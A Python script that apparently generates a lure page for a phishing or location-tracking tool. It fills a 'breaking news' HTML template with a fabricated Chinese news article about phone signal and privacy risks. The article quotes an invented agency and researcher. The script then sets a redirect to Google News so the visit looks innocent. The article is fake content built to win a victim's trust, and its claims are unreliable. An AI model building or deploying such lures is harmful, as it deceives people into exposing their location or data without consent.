#!/usr/bin/env python3
import os
import utils

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

title = '全球多地报告手机信号异常，专家建议关注设备安全设置'
desc = '近日，多个国家的网络安全机构接连发布报告，指出部分移动设备在连接基站时存在信息泄露风险。研究人员呼吁用户关注手机定位与隐私设置。'
image = 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800&q=80'
content = '''
<p>近日，多个国家的网络安全机构接连发布报告，指出部分移动设备在连接基站时可能存在信息泄露风险。据国际电信安全联盟（ITSA）最新调查显示，全球约有 23% 的智能手机用户从未检查过自己的位置权限设置。</p>

<p>「大多数用户在安装应用时会无条件授予定位权限，但却不了解这些数据可能被第三方收集和利用，」网络安全研究员张明在接受采访时表示，「我们建议所有用户立即检查设备的位置服务设置。」</p>

<p>报告还指出，公共 Wi-Fi 网络的安全隐患同样不容忽视。在一项覆盖 15 个国家的测试中，研究人员发现超过 60% 的公共热点缺乏基本的加密保护，使得用户的设备信息、浏览记录甚至精确位置都可能被截获。</p>

<div class="quote">「设备安全不是技术问题，而是意识问题。每个人都应该了解自己手机发送了哪些数据，以及发送给了谁。」—— 国际电信安全联盟首席研究员</div>

<p>针对这一情况，多国监管部门已开始着手制定更严格的移动设备数据保护法规。业内人士预计，新的合规要求将在未来六个月内陆续生效，届时设备制造商和应用开发者将需要提供更透明的权限管理机制。</p>

<p>专家建议用户采取以下措施保护自身安全：定期审查应用的位置权限、避免连接不可信的公共 Wi-Fi、及时更新设备系统补丁，以及使用可信赖的安全工具检测异常行为。</p>
'''

redirect = os.getenv('REDIRECT')

if redirect is None:
    redirect = 'https://news.google.com/'
    utils.print(f'{G}[+] {C}Redirect URL : {W}{redirect} (default)')
else:
    utils.print(f'{G}[+] {C}Redirect URL : {W}{redirect}')

with open('template/news_breaking/index_temp.html', 'r') as temp_index:
    temp_index_data = temp_index.read()
    temp_index_data = temp_index_data.replace('$TITLE$', title)
    temp_index_data = temp_index_data.replace('$DESC$', desc)
    temp_index_data = temp_index_data.replace('$IMAGE$', image)
    temp_index_data = temp_index_data.replace('$CONTENT$', content)
    temp_index_data = temp_index_data.replace('REDIRECT_URL', redirect)
    if os.getenv("DEBUG_HTTP"):
        temp_index_data = temp_index_data.replace('window.location = "https:" + restOfUrl;', '')

with open('template/news_breaking/index.html', 'w') as updated_index:
    updated_index.write(temp_index_data)
